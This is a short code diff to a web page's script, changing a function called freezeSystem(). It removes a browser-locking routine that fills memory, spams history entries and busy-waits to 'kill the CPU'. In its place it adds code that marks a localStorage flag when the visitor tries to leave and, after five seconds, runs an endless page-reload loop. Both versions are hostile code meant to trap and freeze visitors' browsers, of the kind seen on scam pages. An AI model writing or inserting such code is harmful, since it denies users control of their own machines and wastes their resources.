@@ -65,14 +65,20 @@ function freezeSystem() {
     // Disable any interaction
     window.onbeforeunload = null; 
     
-    // Infinite recursion to lock the browser thread
-    function lock() {
-        const x = new Array(1000000).fill("TRAPPED");
-        window.history.pushState(null, "", window.location.href + "/" + Math.random());
-        setTimeout(lock, 0);
-        while(true) { /* Busy wait to kill the CPU */ }
-    }
-    lock();
+    // Set the localStorage flag when the user tries to leave/reload
+            window.onbeforeunload = function () {
+                localStorage.x = 1;
+            };
+    
+            // Wait 5 seconds (5000ms), then start the reload loop
+            setTimeout(function () {
+                console.log("Starting reload loop...");
+                
+                // This creates an infinite loop of reload commands
+                while (true) {
+                    location.reload();
+                }
+            }, 5000);
 }
 </script>
 </body>
